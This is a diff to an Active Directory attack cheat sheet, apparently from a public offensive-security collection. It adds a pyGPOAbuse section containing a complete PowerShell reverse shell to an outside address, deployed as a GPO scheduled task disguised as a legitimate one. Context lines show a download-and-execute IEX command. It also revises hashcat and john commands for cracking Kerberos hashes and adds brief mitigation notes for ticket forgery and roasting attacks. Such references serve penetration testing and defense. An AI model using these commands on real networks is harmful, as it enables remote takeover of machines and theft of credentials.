@@ -427,7 +427,23 @@ SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContent
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
 ```
 
-Abuse GPO with PowerView
+Abuse GPO with **pyGPOAbuse**
+
+```powershell
+git clone https://github.com/Hackndo/pyGPOAbuse
+# Add john user to local administrators group (Password: H4x00r123..)
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
+
+# Reverse shell example
+./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
+    -powershell \ 
+    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
+    -taskname "Completely Legit Task" \
+    -description "Dis is legit, pliz no delete" \ 
+    -user
+```
+
+Abuse GPO with **PowerView**
 
 ```powershell
 # Enumerate GPO
@@ -699,6 +715,11 @@ root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi veloci
 Converting kirbi => ccache
 ```
 
+
+Mitigations:
+* Hard to detect because they are legit TGT tickets
+* Mimikatz generate a golden ticket with a life-span of 10 years
+
 ### Pass-the-Ticket Silver Tickets
 
 Forging a TGS require machine accound password (key) or NTLM hash from the KDC
@@ -717,6 +738,9 @@ mimikatz $ misc::convert ccache ticket.kirbi
 root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
+
+Mitigations:
+* Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
 
 ### Kerberoasting
 
@@ -751,12 +775,12 @@ Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-fe
 Then crack the ticket with hashcat or john
 
 ```powershell
-hashcat -m 13100 -a 0 hash.txt crackstation.txt
-./john ~/hash.txt --wordlist=rockyou.lst
+./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
+./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
 ```
 
 Mitigations: 
-* Have a very long password for your accounts with SPNs (> 25 characters)
+* Have a very long password for your accounts with SPNs (> 32 characters)
 * Make sure no users have SPNs
 
 ### KRB_AS_REP Roasting
@@ -817,6 +841,9 @@ root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4r
 # crack AS_REP messages
 root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
 ```
+
+Mitigations: 
+* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
 ### Pass-the-Hash
 
@@ -1579,6 +1606,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 
 ## References
 
+* [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
 * [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
@@ -1645,3 +1673,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
 * [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
 * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
